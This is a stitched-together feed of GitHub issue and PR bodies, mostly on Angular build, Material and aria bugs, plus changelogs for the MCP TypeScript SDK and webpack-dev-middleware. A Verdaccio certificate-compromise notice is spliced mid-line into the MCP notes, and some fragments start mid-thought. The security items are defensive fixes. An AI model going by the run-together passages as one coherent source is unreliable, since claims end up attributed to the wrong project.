The browser builder accepts `serviceWorker: true` without `ngswConfigPath` and falls back to `<projectRoot>/ngsw-config.json`, but the application builder only accepts a path or `false`. The migration kept `true` when `ngswConfigPath` was not set in the same options object, so the first `ng build` after migrating failed schema validation.

Replace `true` with the `ngswConfigPath` of the same options, then the one in the base options, then the browser builder default.

Issues.Title: fix(@angular/build): remove every output of a deleted asset in watch mode
Issues.Body:
The previous asset state was keyed by source file, so an asset copied to several destinations (two asset entries with the same input, or one copy per locale with `localize`) kept only the last destination. Deleting the source during `ng build --watch` then removed only that copy and left the others in the output directory.

Key the previous asset state by destination instead.

Issues.Title: fix(@angular/build): quote weak ETags of assets served by the dev server
Issues.Body: Extensionless, JavaScript, TypeScript and stylesheet assets served by the dev server and the Vitest browser runner sent an unquoted weak ETag such as `W/25a71cd345af2de4`. RFC 9110 requires the entity tag to be quoted (`W/"25a71cd345af2de4"`), which is how the other ETags in the same middleware are already formatted.

##### Minor Changes

- [#​3057](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/3057) [`c05225a`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/c05225a636c679870b65f8ca4fe83a76ea1cf113) Thanks [@​steipete](https://redirect.github.com/steipete)! - `ServerEvent` takes optional `params`, which the `subscriptions/listen` router delivers with its own subscription ID, so a gateway can forward change notifications with their `_meta` and extension params.

- [#​3047](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/3047) [`46d9c99`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/46d9c9921b6542e813c1ecc5f9fc964085e8e3bb) Thanks [@​KKonstantinov](https://redirect.github.com/KKonstantinov), [@​tobi-oye](https://redirect.github.com/tobi-oye), [@​mattzcarey](https://redirect.github.com/mattzcarey)! - Add the Skills extension (SEP-2640), reachable through new `ext/skills` subpaths; package root exports are unchanged.

  - `@modelcontextprotocol/server/ext/skills`: `SkillsExtension` (`attach(server)` serves `skills/list`, `skills/get`, `resources/directory/read` and a `skill://{+path}` resource template), `SkillsExtension.load(files)` returning a `SkillCatalog` with `entries` and `reload()`, the `SkillFiles` storage adapter with `memorySkillFiles`, `SkillSource` for generated catalogs, `skillEntry`, and `SkillCatalogError`. Invalid skills are skipped with a warning (`onWarning`), or fail under `strict`. A file whose bytes are valid UTF-8 is served as `text`, whatever its MIME type; any other file as a base64 `blob`.
  - `@modelcontextprotocol/server/ext/skills/node`: `loadSkills(folder)` and `nodeSkillFiles(folder)`.
  - `@modelcontextprotocol/client/ext/skills`: `SkillsClient` with `list()` (throws on an invalid entry; `skipInvalid: true` keeps the valid ones and returns the rest in `invalid`), `get()`, `read(skill, path?)` (size, digest and `SKILL.md` frontmatter verified, `SkillVerificationError` on a mismatch; a copy from the response cache that fails a check is fetched once more with `cacheMode: 'refresh'` first) and `readDirectory()`.
  - `@modelcontextprotocol/core/ext/skills`: schemas, types and constants, including `SKILL_LIMITS`. The result schemas follow the stable spec, so `ttlMs` and `cacheScope` are required.

  `SkillsExtension.attach` is `@experimental`: how an extension is wired to a server may change in a minor release. The rest of the Skills API is stable.

  Works on 2025-11-25 and 2026-07-28. On 2026-07-28 only, the server sends the caching fields (`ttlMs`, `cacheScope`), and `SkillsClient` requires them and returns them from `list()`, `get()` and `readDirectory()`.

##### Patch Changes

- [#​3083](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/3083) [`ef38c67`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/ef38c6765a15ee29030340dfea28b013893fa0a2) Thanks [@​claude](https://redirect.github.com/apps/claude)! - The bundled Ajv validator is now built with fast-uri 3.1.8 (was 3.1.0). fast-uri 3.1.6 and later reject a `$id` or `$ref` whose text before the first colon is not a valid URI scheme (`my_tool:output`), or whose URN namespace is not valid (`urn:my_tool:output`): a schema that uses one no longer compiles, and a tool that carries it fails with an invalid-schema error. An underscore without a colon (`my_tool_output`) and a `$ref` into `#/$defs/...` or `#/definitions/...` are not affected.

- [#​2960](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2960) [`43c45f4`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/43c45f4941d824e7251a7d1266823a84af90fab3) Thanks [@​claude](https://redirect.github.com/apps/claude)! - A server whose tool puts `x-mcp-header` on a `number`-typed parameter keeps checking that tool's `Mcp-Param-*` headers on `tools/call`, as 2.3.0 does: a header that is missing for a value in the body, or that disagrees with the body, is answered `400` with JSON-RPC error `-32020`. Clients on a 2026-07-28 connection other than stdio no longer list such a tool and send no `Mcp-Param-*` headers for it, so a call that carries a value for a declared parameter is rejected the same way; the server logs a warning each time tools are listed. - [#​3081](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/3081) [`5820f79`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/5820f796a48ae6b8e756a7fbfd627e7e2e1ac891) Thanks [@​claude](https://redirect.github.com/apps/claude)! - A tool `outputSchema` whose root is a `$ref` to a `type: "object"` entry of its own `$defs` or `definitions` (what zod writes for `z.object({...}).meta({ id })`), or a union of such refs, is now treated as an object schema. On 2025-era connections the tool's schema and `structuredContent` are no longer wrapped in `{ result: ... }`, so a 2025-era client that read `structuredContent.result` for such a tool now reads `structuredContent`.   In October 2026, eMudhra disclosed that the private keys of several of its intermediate certificate authorities had been compromised. Anyone holding those keys can issue a TLS certificate that a client trusting the eMudhra chain accepts as valid, for any host. Verdaccio connects to its uplinks (such as registry.npmjs.org) over HTTPS, so an attacker able to intercept that traffic could impersonate an uplink and serve tampered metadata or tarballs, which Verdaccio would then cache.

Node.js uses that bundled store for outgoing HTTPS by default. The image also upgrades Alpine's `ca-certificates` package at build time. ### Release Notes

<details>
<summary>webpack/webpack-dev-middleware (webpack-dev-middleware)</summary>

### [`v8.5.0`](https://redirect.github.com/webpack/webpack-dev-middleware/blob/HEAD/CHANGELOG.md#850)

[Compare Source](https://redirect.github.com/webpack/webpack-dev-middleware/compare/v8.4.0...v8.5.0)

##### Minor Changes

- `hot.token` also takes `{ value, required }`. With `required: false` a token is minted (or `value` used) and handed to the injected client as usual, but the endpoint does not refuse a client without it, so a server with policy of its own can compare it in `onConnect` alongside, say, the origins it already allows. The instance's new `hot.tokenRequired` says which applies. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2486](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2486))

### [`v8.4.0`](https://redirect.github.com/webpack/webpack-dev-middleware/blob/HEAD/CHANGELOG.md#840)

[Compare Source](https://redirect.github.com/webpack/webpack-dev-middleware/compare/v8.3.0...v8.4.0)

##### Minor Changes

- The client posts build events to the page the way webpack-dev-server's does (`webpackOk`, `webpackErrors`, `webpackClose` and the rest), logs `Disconnected!` when the connection drops and clears the build's problems from the overlay until it is back. `progress` accepts `"circular"` or `"linear"`. Reloads skip a page that is already navigating away, use the nearest ancestor with a url of its own inside an `about:blank` iframe, and in `apply: "reload"` follow a sibling compilation's build too. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2425](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2425))

- `HotModuleReplacementPlugin` now goes to every compilation the middleware serves, including server bundles that hot-reload through `webpack/hot/poll`. `hot.client.transport` also accepts a module exporting a client class of your own, and the new `hot.ws` option is passed to the `ws` server (compression, `verifyClient`, or a `port` or `server` of its own), with `hot.cors` and `hot.token` still checked. The connection the runtime holds is exported as `webpack-dev-middleware/client/socket` for tooling that listens alongside it. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2472](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2472))

- Grouped `etag`, `lastModified`, `cacheControl` and `cacheImmutable` into `cache.*`, and `mimeTypes` and `mimeTypeDefault` into `mime.*`; the old names warn and keep working until the next major release, and the grouped name wins when both are set. Media types now resolve through `mime-db` directly, and `mime.types` belongs to its own middleware instead of being written into the table `mime-types` shares with the whole process. `instance.context.options` is a copy of the options passed, `cache.control` included. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2455](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2455))

- `hot.client.apply` (`"hmr"`, `"hmr-only"`, `"reload"` or `"nothing"`) says what a build does to the page, so a project without HMR still reloads on a change; a single page can choose its own mode with `?webpack-dev-middleware-apply=`, and publishing `{ action: "reload" }` reloads every page. `hot.client.connect` (`false`, or `{ retries, timeout }`) controls connecting and reconnecting, with `retries` honoured on both transports. The `hot`, `liveReload`, `reload`, `autoConnect`, `reconnect` and `timeout` query parameters they replace are still read until the next major release, with a deprecation warning for this package's own three. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2458](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2458))

- Added `hot.client`, which sets the browser runtime's options on the middleware under the same names the entry query takes, so a configuration no longer needs a hand-written query string. `url` accepts a url or its parts (`{ port: 8080 }`) and resolves the rest in the page, `pageParamPrefix` renames the per-page `?webpack-dev-middleware-apply=` parameter, and `logging` accepts `{ level, name }` so an embedding package can label the console with its own name. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2436](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2436))

- Added `hot.cors` to choose which origins may reach the hot endpoint: Server-Sent Events still allow every origin until the next major release, while the new WebSocket transport allows only local origins and refuses others with `403` before the handshake. Added `hot.token`, a secret the injected client carries and the endpoint requires, for the case where a browser sends no `Origin`; it is off by default. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2444](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2444))

- `hot` now adds the client and `HotModuleReplacementPlugin` to the compilation itself, so enabling it is all a webpack configuration needs. `hot.inject` says what is added: `"all"` (the default), `"plugin"` for a page with a client of its own, `"client"` for a configuration that applies the plugin itself, or `"none"`. Web workers get a client too, nothing is injected into a non-browser target, and the HMR plugin is left out when `hot.client.apply` is `reload` or `nothing`. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2430](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2430))

- The instance gains `attach(server)`, `handleUpgrade(req, socket, head)`, `onConnect(fn)` (now given the request as well as the client), `publish(payload)` and `publishTo(client, payload)`, so a server can own the upgrade, decide who may listen and put payloads of its own on the stream, such as `ProgressPlugin` ticks. The client understands `{ action: "error", message }`, logging the reason a server refused it and posting it to the page as `webpackError`. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2431](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2431))

- `hot.transport` chooses how events reach the browser: Server-Sent Events (the default), `"ws"` for a WebSocket, or a transport of your own, which only needs `onConnect`, `publish`, `publishTo` and `close`. The client speaks both built-in wires, also exported as `webpack-dev-middleware/client/sse` and `webpack-dev-middleware/client/ws`, and behaves the same on either. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2420](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2420))

- `overlay.id` names the overlay element, so a package embedding it can keep the id its users already query. The new `webpack-dev-middleware/client/problem` export formats one of webpack's errors or warnings with `formatProblem`, and `showProblems` accepts webpack's objects as well as strings. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2438](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2438))

##### Patch Changes

- Bound the internal url and `Range` header caches, which grew for the life of the process and were never released, even by `close()`. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2405](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2405))

- The client exports ship type declarations and are marked as the ES modules they are. The client logs through webpack's `Logger` without `webpack/lib/logging/runtime.js`, so `universal` and `["web", "node"]` bundles no longer pull in a node builtin and a page enforcing Trusted Types needs no guard. A module that re-exports the client can hand it its options through `__webpack_dev_middleware_client_query__`, and `?autoConnect` is read like every other boolean. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2428](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2428))

- Deprecated `hot.progress`, which keeps working until the next major release: a server that applies `ProgressPlugin` itself ended up with two on one compiler. Remove it, apply the plugin yourself and hand its ticks to [`publish`](https://redirect.github.com/webpack/webpack-dev-middleware#publishpayload); the browser-side `hot.client.progress` is unaffected. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2451](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2451))

- The client keeps doing what webpack-dev-server's did: (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2472](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2472))

  - A page url with a malformed escape no longer stops every update.
  - `apply: "reload"` reloads a reconnected page whose build is out of date.
  - A build's warnings are logged and posted along with its errors.
  - An entry written for that server's query (`hostname`, `port`, `pathname`, `live-reload`, `hot=only`) still connects, with no deprecation warning for that server's own spelling.
  - The published client is ES5 down to the logger.
  - The overlay sits at the highest `z-index` and closes on `Esc`.
  - The building indicator works without Shadow DOM and is announced as a progress bar.

- The overlay takes focus when it opens and gives it back when it closes, keeps an uncaught runtime error through a successful build, passes a rejected value to `runtimeErrors` filters as `error.cause`, and no longer shows an empty card or leaves the building indicator up after a multi-compiler build. File references in absolute, Windows and `file://` stack frames are now clickable. The ANSI-to-HTML conversion is built in, dropping `ansi-html-community` and fixing its handling of combined, short and unbalanced sequences. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2437](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2437))

- Validate options with a precompiled schema to cut \~155ms from startup. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2413](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2413))

- Hardened the path-traversal guards in `getFilenameFromUrl`: the remainder left after the `publicPath` prefix is stripped is checked for `..` on its own, before it is joined onto the output root. A `..` that leaves the output root and comes back into it, such as `/assets../dist/file.js`, is now refused rather than served. (by [@​alexander-akait](https://redirect.github.com/alexander-akait) in [#​2445](https://redirect.github.com/webpack/webpack-dev-middleware/pull/2445))

</details>

Issues.Title: fix(@angular/build): include the oxc-parser WASI binding as an optional dependency
Issues.Body:
When running inside a WebContainer environment, such as StackBlitz or the angular.dev playground, native Node.js addons cannot be loaded. The `oxc-parser` package only lists its platform-specific native bindings as optional dependencies and does not include the WebAssembly-based `@oxc-parser/binding-wasm32-wasi` binding. As a result, package managers never install the WASI binding and `oxc-parser` falls back to downloading it on demand at runtime by shelling out to `pnpm` inside a temporary directory. This fallback is executed synchronously while the module graph is being evaluated, from within a worker thread, and via a synchronous `require()` of an ES module. Any failure along that path surfaces as a misleading `ERR_REQUIRE_CYCLE_MODULE` error rather than the underlying cause, which breaks `ng serve` and `ng build` entirely.

The binding loader generated by napi-rs checks whether the WASI binding is already resolvable from `node_modules` before attempting the on-demand download. Declaring `@oxc-parser/binding-wasm32-wasi` as an optional dependency of `@angular/build` ensures that package managers install it alongside the package up front. This allows `oxc-parser` to load the WASI binding directly in WebContainer environments and avoids the fragile runtime installation path. The version is pinned to match `oxc-parser` (`0.150.0` on `22.2.x`) exactly, since the loader rejects bindings whose version does not match the version of the main package. The two dependencies must therefore be kept in lockstep when updating.

Note that at the time of this change, the currently published WASI bindings for `oxc-parser` depend on an `@napi-rs/wasm-runtime` version range that resolves to a release incompatible with the `@emnapi` alpha runtime those bindings were built against. Until a compatible `oxc-parser` release is available, the pre-installed binding will fail to initialize in the same way the on-demand download does. This change is nonetheless a prerequisite for a durable fix and will take effect once `oxc-parser` is updated to a release with compatible WASI bindings.

Related to #34524

Issues.Title: bug(material/datepicker): Focus moves to a date cell instead of returning to the period button after selecting a year/month (WCAG 2.4.3)
Issues.Body:
### Is this a regression?

No, this behaviour has always existed.

### Description

When the calendar’s period button (“Choose month and year”) is activated by keyboard, the calendar switches to the multi-year view and then the year view. After the user selects a year and then a month, the calendar returns to the month view and focus moves to a date cell in the calendar grid. It does not return to the period button that opened the view.

This affects keyboard and screen reader users. They can’t easily change the month or year again, because the next Tab or Shift+Tab stop is unpredictable. They have to navigate back through the grid to reach the period button. We believe this fails WCAG 2.2 SC 2.4.3 (Focus Order) in accessibility audits, because the focus destination after the interaction doesn’t preserve a logical, predictable order relative to the control that triggered it.

### Reproduction

This reproduces on the official Angular Material documentation example: https://material.angular.dev/components/datepicker/overview#datepicker-custom-icon

Steps to reproduce (keyboard only):
1.Open the datepicker with the “Open calendar” button (Enter).
2.Press Tab until the “Choose month and year” period button is focused, then press Enter.
3.Use the arrow keys to select a year and press Enter.
4.Use the arrow keys to select a month and press Enter.
5.Observe where focus lands.


### Expected Behavior

Focus returns to the period button that opened the view, so users can change the month/year again or Tab onward predictably. Alternatively, expose an option to control this, for example an input on mat-calendar.

### Actual Behavior

Focus moves to a date cell (.mat-calendar-body-cell) in the month grid. The period button loses focus and the user has to navigate back to it manually.

### Environment

- Angular: 19.2.14
- CDK/Material: 19.2.19
- Browser(s): Chrome, Safari
- Operating System : macOS

Issues.Title: Feature (MatDialog): Add an option to prevent duplicate dialogs
Issues.Body:
### Feature Description

Currently, Angular Material’s MatDialog allows the same component to be opened multiple times, resulting in multiple instances of the same dialog being displayed simultaneously.

In some applications, this behavior is undesirable. For example, repeated user interactions or multiple event emissions can accidentally open the same dialog more than once.

Developers must currently implement their own duplicate detection logic using MatDialog.openDialogs or MatDialog.getDialogById() before calling MatDialog.open().

Proposed solution

It would be useful to have a built-in option in MatDialogConfig to prevent duplicate instances of the same component from being opened.

For example:

this.dialog.open(MyDialogComponent, {
  preventDuplicates: true,
});

When this option is enabled, attempting to open a component that already has an open dialog could either:

* Return the existing MatDialogRef without creating another instance.
* Ignore the new request and keep the existing dialog open.

The exact behavior could be determined by the maintainers.

Ideally, duplicate detection would be scoped to the component type, with an option to customize the behavior if needed.

Benefits

* Avoids accidentally opening multiple instances of the same dialog.
* Reduces repetitive boilerplate across applications.
* Provides a consistent, framework-level solution.
* Keeps applications simpler and less error-prone.

Alternatives considered

Currently, developers can manually inspect openDialogs or use getDialogById() before opening a dialog. However, this requires additional application-level logic and does not provide a straightforward, reusable option for this common use case.

Would this feature be a good fit for Angular Material’s MatDialog API? I’d be happy to contribute a PR if the maintainers consider this approach appropriate.

This prevented the default behavior of keys like Enter on a link or Space on a button and toggled the panel instead. These changes only handle events coming from a trigger or the group itself.

Fixes #34011.

Issues.Title: bug(aria/accordion): Enter/Space inside a panel toggles the accordion instead of activating the focused element
Issues.Body:
### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

Pressing Enter on a link (or Space on a button) inside an expanded `ngAccordionPanel` collapses the panel instead of activating the link/button.

`ngAccordionGroup` handles `keydown` for the whole group, including panel content, and calls `preventDefault()` on Enter/Space, so the focused element never gets activated. Arrow keys and Home/End are affected too, e.g. Home in an input inside a panel moves focus to the trigger.

The click handler only reacts to events coming from a trigger (`_findTriggerPattern`), the keydown handler doesn't check that:
https://github.com/angular/components/blob/952685f9370ba718f832d745512db7c9a04e1bcd/src/aria/private/accordion/accordion.ts#L73-L97

### Reproduction

StackBlitz link: https://stackblitz.com/edit/z5sxyaq6?file=src%2Fmain.ts

Steps to reproduce:
1. Expand "Section 1".
2. Tab to "Link inside panel" or "Button inside panel" and press Enter / Space.
3. Expand it again, click into the input and press Home.

### Expected Behavior

The link/button is activated (shows up in the log) and the panel stays open. Home moves the caret in the input.

### Actual Behavior

The panel collapses, nothing is activated. Home moves focus to the trigger.

### Environment

- Angular: 22.2.3
- CDK/Material: @angular/aria 22.2.4 (also 22.1.6)
- Browser(s): Chrome 155
- Operating System (e.g. Windows, macOS, Ubuntu): Linux

Issues.Title: build: guard branch-manager against forks and harden checkout
Issues.Body:
This change restores `if: github.event.repository.fork == false` on `.github/workflows/assistant-to-the-branch-manager.yml` on the `22.2.x` branch per GHSS `pull_request_target` policy remediation (b/577107676).

Because 100% of pull requests in `angular/components` originate from forks (`only_allow_releasable_branches: true`) and `branch-manager` requires `context.eventName === 'pull_request_target'` along with `secrets.ANGULAR_ROBOT_PRIVATE_KEY` to set mergeability commit status, the previous `head.repo.fork == false` check caused all fork PR runs to be skipped. Restoring the base repository fork check ensures branch-manager triggers as intended on upstream PRs while preventing runs on external forks.

Additionally, `persist-credentials: false` is added to `actions/checkout` in `.github/workflows/google-internal-tests.yml` for defense-in-depth.

Issues.Title: bug(ClickEventManager): Clicks on iOS 18.2 and before do not have pointer type
Issues.Body:
### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

I found this problem using the listbox component, but I am pretty sure all components that use the ClickEventManager have this problem. iOS versions older than 18.2 do not have a pointer type, the ClickEventManager sees these as fake clicks (see isFakeClick function) and ignores them, so clicks do not work.

See release notes about the pointer type.
https://webkit.org/blog/16301/webkit-features-in-safari-18-2/

### Reproduction

Can be reproduced on https://angular.dev with a iOS version older than 18.2, with multiple components for example on https://angular.dev/guide/aria/select.

### Expected Behavior

Clicks in components handeld via ClickEventManager on iOS version older than 18.2 should work.

### Actual Behavior

Clicks in components handled via ClickEventManager on iOS version older than 18.2 do not work.

### Environment

- Angular: 22.2.3
- CDK/Material: 22.2.3
- Operating System (e.g. Windows, macOS, Ubuntu): iOS version older than 18.2

Issues.Title: refactor(material/core): remove unused private theming variables
Issues.Body: Removes private Sass variables in the theming files that aren't referenced anywhere. The compiled CSS of the prebuilt themes and the theming tests is unchanged.
Issues.RelatedDescription: Open PR "refactor(material/core): remove unused private theming variables" (#34000)

Issues.Title: fix(multiple): avoid duplicate required error with signal forms
Issues.Body:
When a checkbox or slide toggle is bound to a signal forms field whose schema uses `required()`, signal forms set the component's `required` input and also run the component's own validator. This resulted in two `required` errors, and the one from the component doesn't have the message from the schema, which hides it when using `getError('required')`.

These changes skip the component's `required` validation when it's bound to a signal forms field, since the schema already handles it.

Fixes #33945.
Issues.RelatedDescription: Closed or merged PR "fix(multiple): avoid duplicate required error with signal forms" (#33990)

Issues.Title: fix(material/menu): do not pull focus out of an overlay opened by a menu item
Issues.Body:
When a menu item opens an overlay, like a dialog, that focuses its content before the menu closes (e.g. when animations are disabled), the menu would restore focus to its trigger behind the overlay. These changes skip restoring focus when the menu is closed by a click and focus has moved into a different overlay. Focus is still restored if it's in another menu (e.g. when clicking an item in a sub-menu), in the overlay containing the trigger, or outside of any overlay.

Fixes #33967.
Issues.RelatedDescription: Closed or merged PR "fix(material/menu): do not pull focus out of an overlay opened by a menu item" (#33989)

Issues.Title: fix(aria/menu): avoid re-rendering when unrelated elements are added
Issues.Body:
Updates the `SortedCollection` so it doesn't emit changes when a DOM node that's not a member of the collection is added. I also did some internal cleanup so we don't need to re-create the `Set` all the time and to keep a version counter.

Fixes #33976.
Issues.RelatedDescription: Closed or merged PR "fix(aria/menu): avoid re-rendering when unrelated elements are added" (#33996)

Issues.Title: fix(material/checkbox): duplicate required error with signal forms
Issues.Body:
The checkbox has a custom required error in template/reactive forms. When it's used together with the signal forms interop, it was causing double `required` errors to show up. These changes skip the custom validation when signal forms are present.

Also fixes a similar issue with the slide toggle.

Fixes #33945.
Issues.RelatedDescription: Closed or merged PR "fix(material/checkbox): duplicate required error with signal forms" (#33998)

Issues.Title: docs(cdk/scrolling): explain how to react to scroll events
Issues.Body:
Adds a section to the scrolling overview that shows how to listen to scroll events with `cdkScrollable` and the `ScrollDispatcher`, along with a live example.

Fixes #9594 
The scrolling overview only had two short paragraphs about `cdkScrollable` and `ScrollDispatcher` and didn't show how to actually listen to scroll events. This adds:

- a section on `elementScrolled`, `scrolled` and `ancestorScrolled`, with a snippet
- a live example (`cdk-scrollable-overview`) that shows the scroll offset and scrolls back to the top
- a note that the events fire outside the Angular zone, so the view only updates if you use signals or `markForCheck`
Issues.RelatedDescription: Open PR "docs(cdk/scrolling): explain how to react to scroll events" (#33997)
